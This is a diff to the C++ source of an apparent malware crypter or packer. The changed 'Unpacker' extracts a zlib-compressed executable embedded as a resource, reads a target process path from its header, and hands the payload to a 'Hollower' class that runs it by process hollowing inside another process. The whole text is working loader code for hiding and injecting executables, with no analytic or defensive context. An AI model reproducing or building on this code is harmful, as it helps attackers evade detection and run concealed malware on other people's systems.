@@ -4,23 +4,25 @@
 #include <boost/iostreams/filtering_stream.hpp>
 #include <boost/iostreams/filter/zlib.hpp>
 #include <sstream>
+#include "Settings.h"
 
 Unpacker::Unpacker()
 {
 
 }
 
-IMAGE_DOS_HEADER *Unpacker::Unpack()
+BYTE* Unpacker::Unpack()
 {
 	HMODULE hMod = GetModuleHandle(NULL);
 	HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), L"DATA");
-	exe = (IMAGE_DOS_HEADER*)LoadResource(hMod, res);
-
+	data = (BYTE*)LoadResource(hMod, res);
 	DWORD packedSize = SizeofResource(hMod, res);
-	
+
+
+
 	boost::iostreams::filtering_ostream os;
-	const char* end = (char*)((int)exe + packedSize);
-	const char *cExe = (char*)exe;
+	const char* end = (char*)((int)data + packedSize);
+	const char *cExe = (char*)data;
 
 	std::vector<char> compressed;
 	compressed.insert(compressed.end(), cExe, end);
@@ -35,17 +37,25 @@ IMAGE_DOS_HEADER *Unpacker::Unpack()
 		boost::iostreams::write(os, reinterpret_cast<const char*>(&compressed[0]), compressed.size());
 	}
 
+	packLocation = decompressed[0];
+
+	char procPathAnsi[MAX_PATH];
+	memcpy(procPathAnsi, &decompressed[2], MAX_PATH);
+	std::string procPathStr(procPathAnsi);
+
+	procPath = std::wstring(procPathStr.begin(), procPathStr.end());
+
 	BYTE* exeBuff = (BYTE*)HeapAlloc(GetProcessHeap(), MEM_COMMIT, decompressed.size());
-	std::copy(decompressed.begin(), decompressed.end(), exeBuff);
-	return (IMAGE_DOS_HEADER *)exeBuff;	
+	std::copy(decompressed.begin() + EXE_RSRC_OFFSET, decompressed.end(), exeBuff);
+	return exeBuff;	
 }
 
-bool Unpacker::UnpackIntoProcess(std::wstring procPath)
+bool Unpacker::UnpackIntoProcess()
 {
-	this->exe = Unpack();
-	if (!this->exe)
+	this->data = Unpack();
+	if (!this->data)
 		return false;
-	Hollower *hollow = new Hollower(procPath, this->exe);
+	Hollower *hollow = new Hollower(procPath, this->data);
 	hollow->DoHollow();
 	return true;
 }
